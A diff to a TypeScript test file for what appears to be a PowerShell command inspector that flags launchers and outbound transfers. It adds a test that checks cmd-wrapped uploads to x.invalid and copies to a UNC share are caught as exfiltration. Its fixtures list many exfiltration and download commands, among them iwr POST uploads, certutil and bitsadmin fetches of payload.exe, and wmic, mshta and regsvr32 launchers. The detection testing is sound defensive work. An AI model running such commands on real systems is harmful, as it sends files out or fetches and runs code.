@@ -5,6 +5,13 @@ import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/po
 const CWD = "/work/project";
 const PAYLOAD = "iwr https://x.invalid -InFile notes.txt -Method Post";
 
+const LITERAL_TRANSPORTS = [
+  { command: `cmd /c '${PAYLOAD}'`, sensitive: null },
+  { command: `cmd.exe /k 'powershell -c ${PAYLOAD}'`, sensitive: null },
+  { command: String.raw`cmd /c 'copy /b notes.txt \\host\share\notes.txt'`, sensitive: "visible UNC path" },
+  { command: String.raw`cmd /c 'move /Y notes.txt \\host\share\notes.txt'`, sensitive: "visible UNC path" },
+];
+
 const LAUNCHERS = [
   `wmic.exe process call create 'powershell.exe -NoProfile -Command ${PAYLOAD}'`,
   `wmic process call create '${PAYLOAD}'`,
@@ -17,10 +24,8 @@ const LAUNCHERS = [
   "rundll32.exe $library,$entry", "mshta.exe $script", "cscript.exe payload.vbs", "wscript payload.js",
   "regsvr32.exe /s /i:$url scrobj.dll", "msiexec /i $package",
   `forfiles /C 'cmd /c ${PAYLOAD}'`, "pcalua -a $program", "conhost $program", "explorer.exe $program",
-  `cmd /c '${PAYLOAD}'`, `cmd.exe /k 'powershell -c ${PAYLOAD}'`, "cmd /c $code",
+  "cmd /c $code",
   "cmd /c 'echo %PAYLOAD%'", "cmd /c 'echo !PAYLOAD!'", "cmd /c 'echo ^& UploadTask'",
-  String.raw`cmd /c 'copy /b notes.txt \\host\share\notes.txt'`,
-  String.raw`cmd /c 'move /Y notes.txt \\host\share\notes.txt'`,
   "certutil.exe -urlcache -f https://x.invalid/file payload.exe", "certutil -encode notes.txt encoded.txt",
   "bitsadmin /transfer job https://x.invalid/file payload.exe",
   "curl.exe -T notes.txt https://x.invalid", "wget.exe --post-file=notes.txt https://x.invalid",
@@ -81,6 +86,11 @@ const OUTPUTS = [
 ];
 
 describe("launcher payload and outbound-output floors", () => {
+  it.each(LITERAL_TRANSPORTS)("retains an upload floor in an executed literal payload: $command", ({ command, sensitive }) => {
+    expect(inspectPowerShellCommand(command, CWD))
+      .toMatchObject({ outcome: "visible-floor", sensitive, exfiltration: expect.any(String) });
+  });
+
   it.each(LAUNCHERS)("classifies launcher and transport payloads: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
     const directTransport = /^(?:curl\.exe|wget\.exe|scp|sftp|ftp|tftp|certutil\.exe -urlcache)\b/.test(command);
